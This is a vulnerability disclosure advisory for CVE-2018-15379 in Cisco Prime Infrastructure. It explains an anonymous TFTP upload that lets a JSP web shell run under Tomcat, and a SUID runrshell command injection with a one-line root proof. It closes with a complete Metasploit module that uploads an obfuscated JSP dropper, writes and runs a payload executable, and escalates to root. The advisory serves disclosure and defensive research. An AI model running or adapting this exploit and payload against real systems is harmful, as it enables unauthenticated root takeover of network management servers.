**Vulnerabilities Summary**<br>
Cisco Prime Infrastructure (CPI) contains two vulnerabilities that when exploited allow an unauthenticated attacker to achieve root privileges and execute code remotely. The first vulnerability is a file upload vulnerability that allows the attacker to upload and execute JSP files as the Apache Tomcat user. The second vulnerability is a privilege escalation to root by bypassing execution restrictions in a SUID binary.

**Vendor Response**<br>
Cisco has issued an advisory, https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181003-pi-tftp, which provides a workaround and a fix for the vulnerability. From our assessment the provided fix only addresses the file uploading part of the exploit, not the file inclusion, the ability to execute arbitrary code through it or the privileges escalation issue that the product has.

**CVE**<br>
CVE-2018-15379

**Credit**<br>
An independent security researcher, Pedro Ribeiro, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
Cisco Prime Infrastructure 3.2 and newer
Vulnerability Details
First Vulnerability: Arbitrary file upload and execution via tftp and Apache Tomcat
Attack Vector: Remote
Constraints: None
Most web applications running on the CPI virtual appliance are deployed under /opt/CSCOlumos/apache-tomcat-<VERSION>/webapps. One of these applications is “swimtemp”, which symlinks to /localdisk/tftp:
```shell
ade # ls -l /opt/CSCOlumos/apache-tomcat-8.5.14/webapps/
total 16
drwxrwxr-x. 3 root gadmin 4096 Mar 29 19:49 ROOT
drwxrwxr-x. 8 root gadmin 4096 Mar 29 21:44 SSO
lrwxrwxrwx. 1 root gadmin 36 Mar 29 21:32 SSO.war -> /opt/CSCOlumos/wars/SSO-13.0.201.war
drwxrwxr-x. 4 root gadmin 4096 Mar 29 21:45 ifm_poap_rest
lrwxrwxrwx. 1 root gadmin 45 Mar 29 21:32 ifm_poap_rest.war -> /opt/CSCOlumos/wars/ifm_poap_rest-3.70.21.war
lrwxrwxrwx. 1 root gadmin 16 Mar 29 19:49 swimtemp -> /localdisk/tftp/
drwxrwxr-x. 22 root gadmin 4096 May 2 15:20 webacsc
lrwxrwxrwx. 1 root gadmin 30 Mar 29 21:32 webacs.war -> /opt/CSCOlumos/wars/webacs.war
```
As the name implies, this is the directory used by TFTP to store files. Cisco has also enabled the upload of files to this directory as TFTPD is started with the -c (file create) flag, and it accepts anonymous connections:
`/usr/sbin/in.tftpd --ipv4 -vv -c --listen -u prime -a :69 --retransmit 6000000 -s /localdisk/tftp`
The TFTPD port (69) is also open to the world in the virtual appliance firewall, so it is trivial to upload a JSP web shell file using a tftp client to the /localdisk/tftp/ directory.
The web shell will then be available at https://<IP>/swimtemp/<SHELL>, and it will execute as the “prime” user, which is an unprivileged user that runs the Apache Tomcat server.
Second Vulnerability: runrshell Command Injection with root privileges
Attack Vector: Local
Constraints: None
The CPI virtual appliance contains a binary at /opt/CSCOlumos/bin/runrshell, which has the SUID bit set and executes as root. It is supposed to start a restricted shell that can only execute commands in /opt/CSCOlumos/rcmds. The decompilation of this function is shown below:
```c
int main(int argc, char* argv, char* envp)
{
    char dest;
    int i;
    setuid(0);
    setgid(0);
    setenv("PATH", "/opt/CSCOlumos/rcmds", 1);
    memcpy(&dest, "/bin/bash -r -c \"", 0x12uLL);
    for ( i = 1; argc - 1 >= i; ++i )
    {
        strcat(&dest, argv[i]);
        strcat(&dest, " ");
    }
    strcat(&dest, "\"");
    return (system(&dest) & 0xFF00) >> 8;
}
```
As it can be seen above, the binary uses the system() function to execute:
/bin/bash -r -c “<CMD>”. with the PATH set to /opt/CSCOlumos/rcmds, and the restricted (-r) flag passed to bash, meaning that only commands in the PATH can be executed, environment variables cannot be changed or set, directory cannot be changed, etc.<br>
However, due to the way system() function calls “bash -c”, it is trivial to inject a command by forcing an end quote after <CMD> and the bash operator ‘&&’:
[prime@prime34 ~]$ /opt/CSCOlumos/bin/runrshell ‘” && /usr/bin/whoami #’<br>
root

**Exploit**<br>
```ruby
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco Prime Infrastructure Unauthenticated Remote Code Execution',
      'Description'    => %q{
        Cisco Prime Infrastructure (CPI) contains two basic flaws that when exploited allow
        an unauthenticated attacker to achieve remote code execution. The first flaw is a file
        upload vulnerability that allows the attacker to upload and execute files as the Apache
        Tomcat user; the second is a privilege escalation to root by bypassing execution restrictions
        in a SUID binary.
        This module exploits these vulnerabilities to achieve unauthenticated remote code execution
        as root on the CPI default installation.
        This module has been tested with CPI 3.2.0.0.258 and 3.4.0.0.348. Earlier and later versions
        might also be affected, although 3.4.0.0.348 is the latest at the time of writing.
      },
      'Author'         =>
        [
          'Pedro Ribeiro'        # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', 'TODO' ],
          [ 'CVE', 'TODO' ],
          [ 'URL', 'TODO' ],
          [ 'URL', 'TODO' ]
        ],
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Targets'        =>
        [
          [ 'Cisco Prime Infrastructure', {} ]
        ],
      'Privileged'     => true,
      'DefaultOptions' => { 'WfsDelay' => 10 },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'TODO'
    ))
    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 443]),
        OptPort.new('RPORT_TFTP', [true, 'TFTPD port', 69]),
        OptBool.new('SSL', [true, 'Use SSL connection', true]),
        OptString.new('TARGETURI', [ true,  "swimtemp path", '/swimtemp'])
      ])
  end
  def check
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'swimtemp'),
      'method' => 'GET'
    })
    if res && res.code == 404 && res.body.length == 0
      # at the moment this is the best way to detect
      # a 404 in swimtemp only returns the error code with a body length of 0,
      # while a 404 to another webapp or to the root returns code plus a body with content
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end
  def upload_payload(payload)
    lport = datastore['LPORT'] || (1025 + rand(0xffff-1025))
    lhost = datastore['LHOST'] || "0.0.0.0"
    remote_file = rand_text_alpha(rand(14) + 5) + '.jsp'
    tftp_client = Rex::Proto::TFTP::Client.new(
      "LocalHost"  => lhost,
      "LocalPort"  => lport,
      "PeerHost"   => rhost,
      "PeerPort"   => datastore['RPORT_TFTP'],
      "LocalFile"  => "DATA:#{payload}",
      "RemoteFile" => remote_file,
      "Mode"       => 'octet',
      "Context"    => {'Msf' => self.framework, 'MsfExploit' => self},
      "Action"     => :upload
    )
    print_status "Uploading TFTP payload to #{rhost}:#{datastore['TFTP_PORT']} as '#{remote_file}'"
    tftp_client.send_write_request
    remote_file
  end
  def generate_jsp_payload
    exe = generate_payload_exe
    base64_exe = Rex::Text.encode_base64(exe)
    native_payload_name = rand_text_alpha(rand(6)+3)
    var_raw     = rand_text_alpha(rand(8) + 3)
    var_ostream = rand_text_alpha(rand(8) + 3)
    var_pstream = rand_text_alpha(rand(8) + 3)
    var_buf     = rand_text_alpha(rand(8) + 3)
    var_decoder = rand_text_alpha(rand(8) + 3)
    var_tmp     = rand_text_alpha(rand(8) + 3)
    var_path    = rand_text_alpha(rand(8) + 3)
    var_tmp2     = rand_text_alpha(rand(8) + 3)
    var_path2    = rand_text_alpha(rand(8) + 3)
    var_proc2   = rand_text_alpha(rand(8) + 3)
    var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
    chmod = %Q|
    Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path} + " " + #{var_path2});
    Thread.sleep(200);
    |
    var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
    cleanup = %Q|
    Thread.sleep(200);
    Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path} + " " + #{var_path2});
    |
    jsp = %Q|
    <%@page import="java.io.*"%>
    <%@page import="sun.misc.BASE64Decoder"%>
    <%
    try {
      String #{var_buf} = "#{base64_exe}";
      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());
      File #{var_tmp} = File.createTempFile("#{native_payload_name}", ".bin");
      String #{var_path} = #{var_tmp}.getAbsolutePath();
      BufferedOutputStream #{var_ostream} =
        new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      File #{var_tmp2} = File.createTempFile("#{native_payload_name}", ".sh");
      String #{var_path2} = #{var_tmp2}.getAbsolutePath();
      PrintWriter #{var_pstream} =
        new PrintWriter(new FileOutputStream(#{var_path2}));
      #{var_pstream}.println("!#/bin/sh");
      #{var_pstream}.println("/opt/CSCOlumos/bin/runrshell '\\" && " + #{var_path} + " #'");
      #{var_pstream}.close();
      #{chmod}
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path2});
      #{cleanup}
    } catch (Exception e) {
    }
    %>
    |
    jsp = jsp.gsub(/\n/, '')
    jsp = jsp.gsub(/\t/, '')
    jsp = jsp.gsub(/\x0d\x0a/, "")
    jsp = jsp.gsub(/\x0a/, "")
    return jsp
  end
  def exploit
    jsp_payload = generate_jsp_payload
    jsp_name = upload_payload(jsp_payload)
    # we land in /opt/CSCOlumos, so we don't know the apache directory
    # as it changes between versions... so leave this commented for now
    # ... and try to find a good way to clean it later
    # register_files_for_cleanup(jsp_name)
    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], jsp_name),
      'method' => 'GET'
    })
    handler
  end
end
```
